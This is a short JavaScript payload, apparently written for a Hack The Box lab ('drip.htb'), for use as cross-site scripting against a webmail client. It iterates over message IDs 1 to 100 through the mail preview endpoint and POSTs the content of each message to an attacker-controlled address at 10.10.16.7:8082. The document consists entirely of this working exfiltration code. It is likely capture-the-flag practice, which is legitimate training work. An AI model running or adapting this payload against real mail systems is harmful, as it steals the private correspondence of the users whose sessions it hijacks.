for (let i = 1; i <= 100; i++) {
    fetch('http://mail.drip.htb/?task=mail&_caps=&_uid=' + i + '&_mbox=INBOX&_framed=1&_action=preview', {
        mode: 'no-cors'
    }).then((response) => response.text()).then((text) => {
        if (!text.includes("SERVER ERROR")) {
            fetch("http://10.10.16.7:8082", {
                mode: 'no-cors',
                method: "POST",
                body: text
            });
        }
    });
}